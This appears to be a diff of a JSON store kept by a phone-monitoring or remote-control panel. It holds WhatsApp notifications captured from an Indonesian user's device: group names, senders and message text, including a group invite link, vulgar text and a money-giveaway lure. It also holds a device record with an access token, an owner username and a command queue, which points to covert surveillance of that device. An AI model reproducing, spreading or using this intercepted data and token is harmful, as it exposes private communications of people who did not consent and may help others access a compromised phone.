@@ -22,6 +22,30 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (100 pesan): ~ ⸸𝐑𝐄𝐍//𝐕𝐓𝐂//𝐕𝐄𝐑𝐎𝐒//𝟐𝟐𝟓/𝟏𝟎𝟑",
+        "content": "HAIK😆🫰",
+        "time": "29/04 21:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777469989374
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1731 pesan dari 21 chat",
+        "time": "29/04 21:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777469989353
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (99 pesan): ~ qɪs†/𝐂𝟗/𝐑𝐎𝐑/𝟐𝟐𝟓/𝟔𝟒𝟏/@𝙻𝚂𝚃𝙲",
+        "content": "ha emnk bisa ya",
+        "time": "29/04 21:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777469989330
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎1730 pesan dari 21 chat",
         "time": "29/04 21:50",
@@ -3995,30 +4019,6 @@
         "time": "29/04 21:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1777469472925
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (66 pesan): ~ idk",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "29/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777469470332
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗣𝗔𝗦𝗨𝗞𝗔𝗡 𝗣𝗘𝗡𝗚𝗛𝗬𝗧𝗔𝗠𝗔𝗡 (82 pesan): ~ James Alexander",
-        "content": "🔗 𝗖𝗘𝗘𝗦 𝗡𝗚𝗔𝗪𝗜 🇩🇪🙌✨ | https://chat.whatsapp.com/B8tXGrIRaZt92N1ZgZvtGB?mode=gi_t\nWOI JOIN SINI MULAI BERGAUL DAN BERSOSIALISASI NGENTOD🤓",
-        "time": "29/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777469470252
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (236 pesan): ~ Wann : Aku lagi sebar DANA Kaget nih! Yuk, sikat segera sebelum melayang",
-        "content": "💟 Stiker",
-        "time": "29/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777469470233
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777469985258,
+    "lastSeen": 1777469987282,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
